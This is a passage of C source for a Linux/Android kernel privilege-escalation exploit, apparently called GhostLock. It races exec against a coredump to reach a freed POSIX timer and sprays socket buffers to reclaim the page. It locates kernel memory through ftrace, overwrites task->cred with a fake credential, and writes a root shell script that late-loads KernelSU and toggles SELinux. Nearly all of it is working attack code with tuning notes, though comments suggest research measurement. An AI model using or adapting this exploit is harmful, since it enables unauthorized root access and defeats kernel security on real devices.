                 g_t_page_alloc, g_t_page_free, np, vote_a, vote_b, best_cnt);
            g_t_page_free = 0;
            return 0;
        }
        logf("[ids] page_alloc=%u page_free=%u pairs=%d votes=%u/%u "
             "source=pairing strong=%d\n",
             g_t_page_alloc, g_t_page_free, np, vote_a, vote_b, best_cnt);
    }
    return 0;
}

/*
 * The id files are exact; the pairing is the fallback.  The discovery always
 * runs, even when the id files are readable: its page churn and trace cycle
 * are the warm-up the plant was measured with, and skipping it changed the
 * trigger's landing rate (0/12 with the id file read first against a landing
 * on the same-boot old-build control).  The ids are overridden afterwards.
 */
static int init_page_ids(unsigned char *raw)
{
    unsigned a = 0, f = 0;
    int ha = read_event_id("mm_page_alloc", &a) == 0;
    int hf = read_event_id("mm_page_free", &f) == 0;
    int rc = discover_page_types(raw);

    if (ha && hf && a != f)
    {
        logf("[ids] page_alloc=%u page_free=%u source=idfile "
             "(pairing was %u/%u)\n", a, f, g_t_page_alloc, g_t_page_free);
        g_t_page_alloc = a;
        g_t_page_free = f;
        return 0;
    }
    if (rc != 0)
    {
        logf("[-] no page event ids (pairing unreachable and no id files)\n");
        return rc;
    }
    logf("[ids] id files unreadable (alloc=%d free=%d); keeping pairing\n",
         ha, hf);
    if (ha)
    {
        /* Keep the known alloc id (the hit gate needs it); the pairing's
         * other id is the free type unless the pairing was weak and
         * disabled the free gate. */
        if (g_t_page_alloc != a)
        {
            if (g_t_page_free == a)
                g_t_page_free = g_t_page_alloc;
            g_t_page_alloc = a;
        }
    }
    if (hf && g_t_page_free != f)
        g_t_page_free = f;
    return 0;
}

/*
 * Vote the linear-map base from the target's timer slabs and same-PID order-1
 * page_alloc pfns.  Partial-slab pairings are noise; the true base wins by
 * roughly one vote per slab.
 */
struct base_slot
{
    unsigned long long key;
    int cnt;
};

static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
                                     const unsigned long long *ptrs, int nrec,
                                     int *out_slabs, int *out_pfns)
{
    enum
    {
        MAXS = 256,
        MAXP = 512,
        HBITS = 16,
        HSIZE = 1 << HBITS
    };
    unsigned long long slabs[MAXS], pfns[MAXP];
    static struct base_slot tab[HSIZE];
    int ns = 0, np = 0;
    unsigned long long best_base = 0, best_cnt = 0;

    memset(tab, 0, sizeof(tab));
    for (int i = 0; i < nrec && ns < MAXS; i++)
    {
        unsigned long long s = ptrs[i] & ~0x1fffULL;
        int dup = 0;

        for (int j = 0; j < ns; j++)
            if (slabs[j] == s)
            {
                dup = 1;
                break;
            }
        if (!dup)
            slabs[ns++] = s;
    }
    for (size_t i = 16; i + 12 <= n && np < MAXP; i += 4)
    {
        unsigned long long pfn = u64(b, i);
        int dup = 0;

        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != 1 ||
            u32(b, i - 4) != (unsigned)pid ||
            (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        for (int j = 0; j < np; j++)
            if (pfns[j] == pfn)
            {
                dup = 1;
                break;
            }
        if (!dup)
            pfns[np++] = pfn;
    }
    for (int i = 0; i < ns; i++)
    {
        for (int j = 0; j < np; j++)
        {
            unsigned long long base = slabs[i] - (pfns[j] << 12);
            unsigned h = (unsigned)((base >> 12) * 2654435761u) &
                         (HSIZE - 1);

            for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
            {
                if (!tab[h].key)
                {
                    tab[h].key = base;
                    tab[h].cnt = 1;
                    break;
                }
                if (tab[h].key == base)
                {
                    tab[h].cnt++;
                    break;
                }
            }
        }
    }
    for (int i = 0; i < HSIZE; i++)
        if (tab[i].key && (unsigned long long)tab[i].cnt > best_cnt)
        {
            best_cnt = tab[i].cnt;
            best_base = tab[i].key;
        }
    *out_slabs = ns;
    *out_pfns = np;
    return best_cnt >= 8 ? best_base : 0;
}

static unsigned long long calibrate_base(unsigned char *raw)
{
    unsigned long long hist[64] = {0}, hcnt[64] = {0};
    unsigned long long recent[64];
    unsigned long long ptrs[512];
    int hc = 0, rn = 0, made = 0, me = getpid();
    long n;

    trace_start();
    for (int i = 0; i < 512; i++)
    {
        struct sigevent ev;
        timer_t t;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
    /* The calibration timers were created by this (logger) thread. */
    n = read_cpu(g_cpus.log, raw, 32u << 20);
    if (n <= 0)
        return 0;

    {
        int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);

        for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
        {
            unsigned long long pfn = u64(raw, i);

            if (pfn >= (1ULL << 26) || (int)u32(raw, i + 8) != 1 ||
                u32(raw, i - 4) != (unsigned)me ||
                (u32(raw, i - 8) & 0xffff) != g_t_page_alloc)
                continue;
            if (rn == 64)
                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
            recent[rn++] = pfn;
        }
        for (int i = 0; i < c; i++)
        {
            unsigned long long slab = ptrs[i] & ~0x1fffULL;

            for (int j = 0; j < rn; j++)
            {
                unsigned long long base = slab - (recent[j] << 12);
                int f = 0;

                for (int k = 0; k < hc; k++)
                    if (hist[k] == base)
                    {
                        hcnt[k]++;
                        f = 1;
                        break;
                    }
                if (!f && hc < 64)
                {
                    hist[hc] = base;
                    hcnt[hc] = 1;
                    hc++;
                }
            }
        }
    }
    {
        unsigned long long best = 0, bestc = 0;

        for (int k = 0; k < hc; k++)
            if (hcnt[k] > bestc)
            {
                bestc = hcnt[k];
                best = hist[k];
            }
        logf("[base] made=%d best=%#llx count=%llu\n", made, best, bestc);
        return bestc >= 4 ? best : 0;
    }
}

static void kick_rss(void)
{
    size_t n = (size_t)32 << 20;
    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += PAGE)
        p[i] = 1;
    munmap(p, n);
}

static timer_t *g_prefill;

static void prefill_timers(int n)
{
    struct sigevent ev;

    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
    if (!g_prefill)
        return;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < n; i++)
    {
        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
            break;
    }
}

static int prepare_fragmented_range(void)
{
    size_t len = (size_t)VMA_COUNT * PAGE;
    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
    void *base;
    if (fd < 0 || ftruncate(fd, PAGE))
        return -1;
    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED)
        return -1;
    for (unsigned long i = 0; i < VMA_COUNT; i++)
    {
        void *want = (char *)base + i * PAGE;
        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
            return -1;
    }
    close(fd);
    g_frag_base = base;
    g_frag_len = len;
    return 0;
}

static int locker_fn(void *x)
{
    int prot = PROT_NONE;
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    (void)x;
    pin_away(g_cpus.locker[slot % (unsigned)g_cpus.n_locker], g_cpus.victim,
             "locker");
    while (!atomic_load(&g_go))
        sched_yield();
    atomic_fetch_add(&g_locker_started, 1);
    while (!atomic_load(&g_stop))
    {
        syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
    }
    _exit(0);
}
static int gate_fn(void *x)
{
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    (void)x;
    pin_away(g_cpus.locker[slot % (unsigned)g_cpus.n_locker], g_cpus.victim,
             "gate");
    while (!atomic_load(&g_gate_go))
        sched_yield();
    {
        struct timespec a, b;
        long us;

        clock_gettime(CLOCK_MONOTONIC, &a);
        atomic_store(&g_gate_in, 1);
        syscall(SYS_mprotect, g_frag_base, g_frag_len, PROT_NONE);
        clock_gettime(CLOCK_MONOTONIC, &b);
        us = (long)(b.tv_sec - a.tv_sec) * 1000000 +
             (b.tv_nsec - a.tv_nsec) / 1000;
        atomic_store(&g_gate_hold_us, (int)us);
        logf("[+] gate: held the write lock %ldus\n", us);
    }
    while (!atomic_load(&g_stop))
        sched_yield();
    _exit(0);
}
static int sentinel_fn(void *x)
{
    (void)x;
    prctl(PR_SET_NAME, "ysentinel", 0, 0, 0);
    pin_away(g_cpus.locker[0], g_cpus.victim, "sentinel");
    for (;;)
        pause();
    return 0;
}
static int killer_fn(void *x)
{
    int tid, tgid;
    (void)x;
    pin_role(g_cpus.victim, "killer");
    while (!(tid = atomic_load(&g_exec_tid)))
        sched_yield();
    tgid = atomic_load(&g_target_tgid);
    for (;;)
    {
        long r = syscall(SYS_tgkill, tgid, tid, 0);
        if (r < 0 && errno == ESRCH)
            break;
        sched_yield();
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    atomic_store(&g_stop, 1);
    _exit(0);
}
/*
 * The 5.10 trigger: a separate process sharing the target's mm that crashes
 * with a bounded core dump.  Armed by the exec thread immediately before its
 * execve so the coredump's mmap write lock queues ahead of exec_mmap's read
 * lock; 5.10's zap_threads then sets old_mm->core_state while the exec waits.
 * The dump's file is the cwd's `core` (core_pattern = core here).
 */
static int crasher_fn(void *x)
{
    (void)x;
    /* Named so the parent can find the dumper to kill (TIMER_KILL_DUMP). */
    prctl(PR_SET_NAME, "ycrasher", 0, 0, 0);
    pin_role(g_cpus.victim, "crasher");
    while (!atomic_load(&g_crash_now))
        sched_yield();
    {
        struct rlimit rl = {CORE_LIMIT, CORE_LIMIT};

        (void)setrlimit(RLIMIT_CORE, &rl);
    }
    prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
    /* The log must not add syscalls here: the crash has to beat de_thread's
     * zap of the thread group (see the R3 trigger record).  The layout line
     * carries the victim CPU this thread shares with the exec thread.
     * TIMER_CRASH_LOG=1 restores the line for diagnostics, at the measured
     * cost of the landing (R3b.10). */
    if (getenv("TIMER_CRASH_LOG"))
        logf("[+] crasher: armed, crashing for the core_state window\n");
    *(volatile int *)0 = 1;
    return 0;
}

static int spawn_vm_helper(int (*fn)(void *))
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (st == MAP_FAILED)
        return -1;
    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
    if (p < 0)
        munmap(st, HELPER_STACK);
    return p;
}

static void *exec_thread(void *x)
{
    struct sigevent ev_none, ev_victim;
    struct itimerspec dormant;
    char b = 'R', ack;
    char *const argv[] = {(char *)"", NULL};
    char *const envp[] = {NULL};
    (void)x;
    pin_role(g_cpus.victim, "exec");
    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
    memset(&ev_none, 0, sizeof(ev_none));
    ev_none.sigev_notify = SIGEV_NONE;
    memset(&ev_victim, 0, sizeof(ev_victim));
    ev_victim.sigev_notify = SIGEV_SIGNAL;
    ev_victim.sigev_signo = SIGRTMIN;
    memset(&dormant, 0, sizeof(dormant));
    dormant.it_value.tv_sec = 3600;

    if (write(g_ready_w, &b, 1) != 1)
        _exit(117);
    if (read(g_ack_r, &ack, 1) != 1)
        _exit(118);

    for (int i = 0; i < NTIMERS; i++)
    {
        timer_t t;
        struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
            _exit(120);
        if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL))
            _exit(121);
    }
    {
        struct plant_ids ids;

        ids.tid = (int)syscall(SYS_gettid);
        ids.crasher = atomic_load(&g_crasher_pid);
        ids.sentinel = atomic_load(&g_sentinel_pid);
        atomic_store(&g_exec_tid, ids.tid);
        if (write(g_tid_w, &ids, sizeof(ids)) != sizeof(ids))
            _exit(122);
    }
    /* Keep the target paused until the parent has captured V and armed the
     * spray; the free still has not happened at this point. */
    if (g_timer_go_r >= 0)
    {
        char tgo;

        if (read(g_timer_go_r, &tgo, 1) != 1)
            _exit(124);
    }
    atomic_store(&g_go, 1);
    while (atomic_load(&g_locker_started) < LOCKERS)
        sched_yield();
    for (volatile unsigned long i = 0; i < 5000000UL; i++)
        __asm__ volatile("" ::: "memory");
    /* The crasher first (it shares this CPU and must win its race), then the
     * parent's early spray, which then has the free window to itself. */
    if (g_gate_env && TRIGGER == TRIGGER_CORE_STATE)
    {
        /* Get the gate into its long mprotect before the crash, so the
         * coredump's write request queues behind a held writer. */
        atomic_store(&g_gate_go, 1);
        while (!atomic_load(&g_gate_in))
            sched_yield();
        for (volatile unsigned long i = 0; i < 50000UL; i++)
            __asm__ volatile("" ::: "memory");
    }
    if (TRIGGER == TRIGGER_CORE_STATE)
    {
        atomic_store(&g_crash_now, 1);
        if (g_gate_env)
        {
            /* The ordering that makes the landing structural: the exec must
             * not reach exec_mmap's read lock until the crasher is already
             * queued on the mmap write lock.  The crasher blocks in
             * coredump_wait's down_write_killable (TASK_KILLABLE = D), and
             * rwsem serves that queued writer before the exec's later
             * reader, so the zap's core_state is seen. */
            int pid = atomic_load(&g_crasher_pid);
            int blocked = 0;
            char wch[96] = "";

            for (int i = 0; i < 4000 && pid > 0; i++)
            {
                sched_yield();
                if (task_state(pid) == 'D' &&
                    task_wchan(pid, wch, sizeof wch) &&
                    strstr(wch, "rwsem_down_write"))
                {
                    blocked = 1;
                    break;
                }
            }
            logf("[+] gate: crasher=%d blocked=%d wchan=%s\n", pid, blocked,
                 wch);
        }
    }
    if (g_arm_w >= 0)
    {
        char a = 'A';

        (void)write(g_arm_w, &a, 1);
        close(g_arm_w);
        g_arm_w = -1;
    }
    execve("/proc/self/exe", argv, envp);
    _exit(123);
}

static void run_target(void)
{
    pthread_t th;
    sigset_t set;
    atomic_store(&g_target_tgid, (int)getpid());
    if (g_leader_away)
        pin_away(g_cpus.locker[0], g_cpus.victim, "target");
    else
        pin_role(g_cpus.victim, "target");
    if (prepare_fragmented_range())
        _exit(110);
    for (int i = 0; i < LOCKERS; i++)
        if (spawn_vm_helper(locker_fn) < 0)
            _exit(111);
    if (TRIGGER == TRIGGER_CORE_STATE)
    {
        int c = spawn_vm_helper(crasher_fn);

        if (c < 0)
            _exit(113);
        atomic_store(&g_crasher_pid, c);
        if (g_gate_env && spawn_vm_helper(gate_fn) < 0)
            _exit(115);
        if (g_kill_dump)
        {
            int s = spawn_vm_helper(sentinel_fn);

            if (s < 0)
                _exit(116);
            atomic_store(&g_sentinel_pid, s);
        }
    }
    else if (spawn_vm_helper(killer_fn) < 0)
        _exit(112);
    sigemptyset(&set);
    sigaddset(&set, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &set, NULL);
    if (pthread_create(&th, NULL, exec_thread, NULL))
        _exit(114);
    for (;;)
        sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
    /* TAXONOMY BUILD: 5 s instead of 0.4 s.  The trigger is measured slower
     * here than on the author's 6.12 target; a window that expires early sends
     * the parent down the join path while the child is still dying. */
    struct timespec pause = {.tv_nsec = 1000000};
    for (int i = 0; i < 5000; i++)
    {
        memset(si, 0, sizeof(*si));
        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
            return -1;
        if (si->si_pid == pid)
            return 0;
        nanosleep(&pause, NULL);
    }
    return -1;
}

static long now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

/* The task-state letter from /proc/<pid>/stat, or 0.  The gate arm reads it
 * for the crasher: a 'D' after the crash is the TASK_KILLABLE block in
 * coredump_wait's down_write_killable (the first possible block in the dump
 * path; coredump_wait runs before the core file is opened). */
static int task_state(int pid)
{
    char path[48], buf[512];
    int fd, st = 0;
    ssize_t n;
    char *p;

    snprintf(path, sizeof path, "/proc/%d/stat", pid);
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return 0;
    n = read(fd, buf, sizeof buf - 1);
    close(fd);
    if (n <= 0)
        return 0;
    buf[n] = 0;
    p = strrchr(buf, ')');
    if (p && p[1] == ' ' && p[2])
        st = (unsigned char)p[2];
    return st;
}

/* The sleeping task's kernel symbol (/proc/<pid>/wchan).  The gate arm needs
 * the crasher blocked *on the mmap write lock*, not merely in D somewhere on
 * the way to it. */
static int task_wchan(int pid, char *buf, size_t cap)
{
    char path[48];
    int fd;
    ssize_t n;

    buf[0] = 0;
    snprintf(path, sizeof path, "/proc/%d/wchan", pid);
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return 0;
    n = read(fd, buf, cap - 1);
    close(fd);
    if (n <= 0)
        return 0;
    buf[n] = 0;
    return 1;
}

struct kill_args { int target; int crasher; int sentinel; };

static void *kill_dump_thread(void *x)
{
    struct kill_args *a = x;
    int sent = a->sentinel, crasher = a->crasher, seen = 0;

    if (!sent || !crasher)
    {
        logf("[!] dump kill: sentinel=%d crasher=%d missing\n", sent, crasher);
        return NULL;
    }
    logf("[+] dump kill: sentinel=%d crasher=%d\n", sent, crasher);
    /* The sentinel is the only mm user whose exit is not otherwise blocked:
     * before the zap it sleeps in pause() (S); the zap's SIGKILL starts its
     * do_exit, and exit_mm finds core_state set and waits in TASK_UNINTERRUPTIBLE
     * (D) for coredump_finish.  D here means the zap has happened. */
    for (int i = 0; i < 6000; i++) /* up to 3 s at 500us */
    {
        int st = task_state(sent);

        if (st == 'D')
        {
            seen = 1;
            break;
        }
        if (!st)
            break;
        usleep(500);
    }
    /* R3b.10 boundary: record, do not log.  An fsync here is a syscall in the
     * window the dump kill exists to shape; the parent logs the note at the
     * verdict.  The SIGKILL is still the first action. */
    g_dump_kill_seen = (seen && kill(crasher, SIGKILL) == 0) ? 1 : 0;
    g_dump_kill_pid = crasher;
    return NULL;
}

static void park_forever(const char *why)
{
    logf("[!] %s -- parking without reap (zombie held)\n", why);
    fflush(stdout);
    for (;;)
        pause();
}

/* Success path for `fake`: the parked process keeps the reclaimed page alive
 * so the child's fake cred stays valid; a reboot is the cleanup. */
static void hold_forever(void)
{
    logf("[+] done; fake cred page held by this process, reboot to clean\n");
    fflush(stdout);
    for (;;)
        pause();
}

/*
 * Stale timer node layout inside the reclaimed order-1 page.
 *   zero: parent=0 -> rb_erase writes 0 to target.
 *   fake: parent=node -> rb_erase writes node to target (task->cred); the
 *         fake cred fields are overlaid at the same offset by run_plant.
 */
static void build_payload(unsigned char *buf, size_t off,
                          unsigned long long parent, unsigned long long target)
{
    memset(buf, 0, SOCKBUF);
    *(unsigned long long *)(buf + off + 0x00) = parent;
    *(unsigned long long *)(buf + off + 0x10) = target;
}

/* GhostLock's final stage, reduced to its root-child handoff. */
static void write_ksu_script(void)
{
    /*
     * The handoff is manager-agnostic: find an installed manager whose
     * libksud.so supports late-load (ReSukiSU, KernelSU, KernelSU-Next,
     * BakaSU, ...), keep its package name for --package-name, and let ksud
     * auto-detect the KMI.  The PoC's original me.weishu.kernelsu +
     * android16-6.12 constants were the author's device.
     */
    static const char script[] =
        "#!/system/bin/sh\n"
        "echo \"[ksu] start uid=$(id -u) selinux=$(getenforce)\"\n"
        "grep -E '^(Cap|Seccomp)' /proc/self/status\n"
        "KSUD=''\n"
        "PKG=''\n"
        "for p in com.resukisu.resukisu com.sukisu.ultra me.weishu.kernelsu "
        "com.rifsxd.ksunext org.bakasu.bakasu com.kowx712.supermanager; do\n"
        "  APK=$(pm path \"$p\" 2>/dev/null | head -1 | cut -d: -f2)\n"
        "  [ -n \"$APK\" ] || continue\n"
        "  K=\"$(dirname \"$APK\")/lib/arm64/libksud.so\"\n"
        "  [ -x \"$K\" ] || continue\n"
        "  \"$K\" late-load --help >/dev/null 2>&1 || continue\n"
        "  KSUD=\"$K\"; PKG=\"$p\"; break\n"
        "done\n"
        "[ -x \"$KSUD\" ] || KSUD=/data/local/tmp/ksud\n"
        "[ -x \"$KSUD\" ] || KSUD=/data/adb/ksu/bin/ksud\n"
        "if [ ! -x \"$KSUD\" ]; then echo '[ksu] ksud missing'; exit 1; fi\n"
        "echo \"[ksu] manager=$PKG ksud=$KSUD version=$(\"$KSUD\" --version 2>&1 | head -1)\"\n"
        "if [ -n \"$PKG\" ]; then\n"
        "  \"$KSUD\" late-load --allow-shell --package-name \"$PKG\"\n"
        "else\n"
        "  \"$KSUD\" late-load --allow-shell\n"
        "fi\n"
        "RC=$?\n"
        "echo \"[ksu] late-load rc=$RC\"\n"
        "i=0\n"
        "while [ $i -lt 50 ]; do\n"
        "  grep -q '^kernelsu ' /proc/modules && break\n"
        "  i=$((i+1)); sleep 0.1\n"
        "done\n"
        "if grep -q '^kernelsu ' /proc/modules; then echo KSU_LOADED; "
        "else echo KSU_MISSING; fi\n"
        "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
        "echo \"[ksu] enforce=$(getenforce)\"\n";
    int fd = open("/data/local/tmp/ksu_stage.sh",
                  O_WRONLY | O_CREAT | O_TRUNC, 0755);

    if (fd < 0)
        return;
    (void)!write(fd, script, sizeof(script) - 1);
    close(fd);
    (void)chmod("/data/local/tmp/ksu_stage.sh", 0755);
}

static int read_panic_on_warn(void)
{
    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
    int value = -1;

    if (f)
    {
        if (fscanf(f, "%d", &value) != 1)
            value = -1;
        fclose(f);
    }
    logf("[ksu] panic_on_warn=%d\n", value);
    return value;
}

/* Readable from the shell domain; 0 means in permissive mode. */
static int read_enforce(void)
{
    FILE *f = fopen("/sys/fs/selinux/enforce", "r");
    int value = -1;

    if (f)
    {
        if (fscanf(f, "%d", &value) != 1)
            value = -1;
        fclose(f);
    }
    logf("[ksu] selinux enforce=%d\n", value);
    return value;
}

struct plant_res
{
    unsigned long long A;
    int ok;
    int retry;
};

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw);

static int stage_write(unsigned long long target, int mode,
                       const char *what, unsigned char *raw,
                       struct plant_res *out)
{
    struct plant_res r;

    for (int attempt = 1; attempt <= g_stage_attempts; attempt++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
             mode == 2 ? "fake" : "zero", attempt);
        run_plant(target, 1, mode, &r, raw);
        if (r.ok)
        {
            if (out)
                *out = r;
            return 0;
        }
        if (!r.retry)
        {
            logf("[-] stage %s failed\n", what);
            return -1;
        }
    }
    logf("[-] stage %s exhausted retries\n", what);
    return -1;
}

#define SPRAY_THREADS 8
#define SPRAY_SOCKS 2048
#define SPRAY_PRE 2000
#define SPRAY_POST 10000
/* TAXONOMY BUILD: env-overridable volumes (TIMER_SPRAY_PRE/POST); 0/0 is the
 * forced B-free state.  TIMER_SPRAY_EARLY=1 selects the R3b.2 schedule: one
 * continuous stream released before the target execs, instead of the
 * after-zombie phase 1 and the free-event-released phase 2. */
static int g_spray_pre = SPRAY_PRE, g_spray_post = SPRAY_POST;
static int g_spray_early;
/* R3b.3 diagnostic: the old tool polled its wait_zombie loop on the victim
 * CPU every 1 ms, a periodic preemption of the exec thread; this reproduces
 * it for the landing-rate A/B (off by default). */
static int g_log_on_victim;
static _Atomic int g_burst, g_burst2, g_stop_spray;
static int g_pool[SPRAY_SOCKS][2];
static int g_pool_n;
static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
static _Atomic int g_spray_tids[SPRAY_THREADS];

struct spray_arg
{
    unsigned char *payload;
    int sock_first, sock_count, cpu, idx;
};

static void ensure_pool(void)
{
    int snd = 16 << 20;

    if (g_pool_n)
        return;
    for (int i = 0; i < SPRAY_SOCKS; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
            break;
        setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_pool_n++;
    }
    if (!g_pool_n)
        park_forever("no spray sockets");
}

static void ensure_raw(void)
{
    for (int cpu = 0; cpu < 8; cpu++)
    {
        char path[128];

        if (g_rawfd[cpu] >= 0)
            continue;
        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
    }
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
    size_t tot = 0;

    if (fd < 0)
        return 0;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);

        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    return (long)tot;
}

/*
 * V3B BUILD.  What one 8192-byte spray write allocates on 6.1.138:
 * unix_stream_sendmsg computes data_len=8192, header_len=0, and
 * alloc_skb_with_frags(0, 8192, max_page_order=3) takes its order-1 arm --
 * one alloc_pages(order 1) per write, gfp =
 * (GFP_KERNEL & ~__GFP_DIRECT_RECLAIM) | __GFP_COMP | __GFP_NOWARN
 * (net/unix/af_unix.c, net/core/skbuff.c).  The same thread can also allocate
 * an order-1 slab page for skbuff_head_cache (32 x 256 B per 2-page slab,
 * about one write in 32); SLUB always sets __GFP_NORETRY on a slab page, the
 * frag path never does, and a slab page does NOT carry the payload.  Only the
 * frag-signature hit may be reaped; every other touch parks.
 *
 * mm_page_alloc gfp bits on this kernel (events/kmem/mm_page_alloc/format):
 * __GFP_DIRECT_RECLAIM 0x400, __GFP_NOWARN 0x2000, __GFP_NORETRY 0x10000.
 */
#define GFP_NORETRY 0x10000ULL

struct tax_state
{
    int hit;                 /* frag-signature order-1 alloc at slab_pfn */
    int hit_pid;
    unsigned long long hit_gfp;
    int slab_pid;            /* spray-tid order-1 slab page (no payload) */
    unsigned long long slab_gfp;
    int foreign_pid;         /* non-spray order-1 alloc at slab_pfn */
    unsigned long long foreign_gfp;
    int split_pid;           /* order-0 alloc touching one half */
    unsigned long long split_pfn;
    unsigned long long split_gfp;
    int split_half;
    int block_pid;           /* order >= 2 alloc covering the pair */
    unsigned block_order;
    unsigned long long block_pfn;
};

static struct tax_state g_tax;

static int is_spray_tid(int pid)
{
    for (int j = 0; j < SPRAY_THREADS; j++)
        if (pid == atomic_load(&g_spray_tids[j]))
            return 1;
    return 0;
}

/*
 * Classify every mm_page_alloc record whose block intersects the victim's
 * 8 KiB slab pair [slab_pfn, slab_pfn+2).  Sticky across polls; returns the
 * frag-signature hit.  The frame layout is the one the rest of the file uses:
 * [i-8] type, [i-4] pid, [i] pfn, [i+8] order, [i+16] gfp_flags.
 */
static int scan_page_alloc_ev(const unsigned char *b, size_t n,
                              unsigned long long slab_pfn)
{
    for (size_t i = 16; i + 24 <= n; i += 4)
    {
        unsigned long long pfn, gfp;
        unsigned order;
        int pid;
        size_t gfp_at;

        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        pfn = u64(b, i);
        order = u32(b, i + 8);
        if (order > 10)
            continue;
        if (!(pfn < slab_pfn + 2 && pfn + (1ULL << order) > slab_pfn))
            continue;
        gfp_at = i - 8 + g_page_gfp_off;
        if (gfp_at + g_page_gfp_size > n)
            continue;
        gfp = g_page_gfp_size == 4 ? (unsigned long long)u32(b, gfp_at)
                                   : u64(b, gfp_at);
        pid = (int)u32(b, i - 4);
        if (order == 1 && pfn == slab_pfn)
        {
            if (is_spray_tid(pid) && !(gfp & GFP_NORETRY))
            {
                if (!g_tax.hit)
                {
                    g_tax.hit = 1;
                    g_tax.hit_pid = pid;
                    g_tax.hit_gfp = gfp;
                }
            }
            else if (is_spray_tid(pid))
            {
                if (!g_tax.slab_pid)
                {
                    g_tax.slab_pid = pid;
                    g_tax.slab_gfp = gfp;
                }
            }
            else if (!g_tax.foreign_pid)
            {
                g_tax.foreign_pid = pid;
                g_tax.foreign_gfp = gfp;
            }
        }
        else if (order == 0)
        {
            if (!g_tax.split_pid)
            {
                g_tax.split_pid = pid;
                g_tax.split_pfn = pfn;
                g_tax.split_gfp = gfp;
                g_tax.split_half = (int)(pfn - slab_pfn);
            }
        }
        else if (!g_tax.block_pid)
        {
            g_tax.block_pid = pid;
            g_tax.block_order = order;
            g_tax.block_pfn = pfn;
        }
    }
    return g_tax.hit;
}

static void *spray_thread(void *x)
{
    struct spray_arg *a = x;
    int w = 0;

    atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
    pin_role(a->cpu, "spray");
    /* TIMER_SPRAY_IDLE=1: sleep in the pre-burst wait.  A sched_yield loop
     * leaves a runnable spray thread on the victim CPU through the trigger,
     * competing with the exec thread and the crasher at the microsecond the
     * crasher must win; the R3 standalone test (no spray threads) lands
     * 8/10.  The wake latency here is 100us, far inside the free window. */
    while (!atomic_load(&g_burst))
    {
        if (g_spray_idle)
            usleep(100);
        else
            sched_yield();
    }
    if (g_spray_early)
    {
        /* R3b.2: one stream from the release through the free window.  The
         * free event is observed for the record, never acted on -- a reader
         * cannot react inside the allocator's window. */
        while (!atomic_load(&g_stop_spray) &&
               w < g_spray_pre + g_spray_post)
        {
            int k = a->sock_first + (w % a->sock_count);

            (void)write(g_pool[k][0], a->payload, SOCKBUF);
            w++;
        }
        return NULL;
    }
    /* Phase 1 runs before the target execs; it catches an early free. */
    while (!atomic_load(&g_stop_spray) && w < g_spray_pre)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    /* Phase 2 is released when the parent sees the victim page free. */
    while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
    {
        if (g_spray_idle)
            usleep(100);
        else
            sched_yield();
    }
